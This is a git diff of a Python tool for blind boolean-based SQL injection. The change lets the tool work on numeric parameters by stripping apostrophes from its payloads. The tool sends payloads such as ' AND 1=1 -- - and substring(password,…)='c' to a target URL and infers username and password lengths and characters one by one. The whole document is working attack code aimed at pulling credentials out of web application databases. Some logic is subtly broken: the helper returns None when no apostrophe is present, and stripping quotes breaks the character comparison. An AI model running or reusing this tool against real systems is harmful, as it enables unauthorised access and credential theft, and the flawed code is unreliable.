@@ -4,7 +4,6 @@ import string
 import argparse
 
 # TODO:
-#   Add a function to remove the apostrophe in the extraction payloads when not needed
 #   Add database and table enumeration
 
 charset = string.ascii_letters + string.digits + string.punctuation
@@ -20,6 +19,18 @@ PAYLOADS = [
     " AND 1=1 -- -",
     " AND 1=0 -- -"
 ]
+
+def remove_apostrophe(payload):
+    if "'" in payload:
+        new_payload = payload.replace("'","")
+        return new_payload
+
+def is_numeric(value):
+    try:
+        int(value)
+        return True
+    except ValueError:
+        return False
 
 def check_difference(baseline_text, new_text):
     diff = difflib.Differ()
@@ -50,17 +61,24 @@ def test_for_sqli(target, param="id", value="1"):
     return False
 
 def test_condition(payload, target, param="id", value="1"):
+    # Determine if value is numeric
+    numeric = is_numeric(value)
+
     # Get response for the condition we're testing
     response = requests.get(target, headers=headers, params={param: f"{value}{payload}"})
     test_text = response.text
 
     # Get response for a known FALSE condition
     false_payload = "' AND 1=0 -- -"
+    if numeric:
+        false_payload = remove_apostrophe(false_payload)
     false_response = requests.get(target, headers=headers, params={param: f"{value}{false_payload}"})
     false_text = false_response.text
 
     # Get response for a known TRUE condition
     true_payload = "' AND 1=1 -- -"
+    if numeric:
+        true_payload = remove_apostrophe(true_payload)
     true_response = requests.get(target, headers=headers, params={param: f"{value}{true_payload}"})
     true_text = true_response.text
 
@@ -79,8 +97,11 @@ def test_condition(payload, target, param="id", value="1"):
     return False
 
 def find_password_length(value, param, target):
+    numeric = is_numeric(value)
     for length in range(1, 1024):
         payload = f"' AND length(password)={length} -- -"
+        if numeric:
+            payload = remove_apostrophe(payload)
         print(f"[+] Testing on {target}?{param}={value}{payload}")
         result = test_condition(payload, target, param, value)
 
@@ -91,8 +112,11 @@ def find_password_length(value, param, target):
     return None
 
 def find_username_length(value, param, target):
+    numeric = is_numeric(value)
     for length in range(1, 1024):
         payload = f"' AND length(username)={length} -- -"
+        if numeric:
+            payload = remove_apostrophe(payload)
         print(f"[+] Testing on {target}?{param}={value}{payload}")
         result = test_condition(payload, target, param, value)
 
@@ -103,8 +127,11 @@ def find_username_length(value, param, target):
     return None
 
 def find_character(value, position, target, param="id", field="password"):
+    numeric = is_numeric(value)
     for char in charset:
         payload = f"' AND substring({field},{position},1)='{char}' -- -"
+        if numeric:
+            payload = remove_apostrophe(payload)
         print(f"[+] Testing condition on {target}?{param}={value}{payload}")
         result = test_condition(payload, target, param, value)
 
@@ -165,3 +192,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
